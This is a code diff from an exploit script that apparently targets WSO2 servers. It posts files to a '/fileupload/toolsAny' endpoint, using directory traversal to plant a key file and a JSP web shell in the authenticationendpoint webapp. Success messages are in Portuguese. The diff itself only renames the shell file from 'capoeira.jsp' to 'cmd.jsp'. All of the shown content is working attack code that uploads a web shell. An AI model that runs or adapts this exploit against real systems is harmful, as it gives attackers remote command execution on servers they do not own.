@@ -40,10 +40,10 @@ public_key = '''KEY'''
 
 def exploit(url):
     try:
-        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira": public_key})
-        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira.jsp": shell})
+        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/cmd": public_key})
+        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp": shell})
         if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
-            console.log(f"[green][<>] Explorado com sucesso, shell : [bold]{url}/authenticationendpoint/capoeira.jsp[/bold][/green]")
+            console.log(f"[green][<>] Explorado com sucesso, shell : [bold]{url}/authenticationendpoint/cmd.jsp[/bold][/green]")
 
         else:
             console.log(f"\r[red][!] Falhou [/red] {url}")
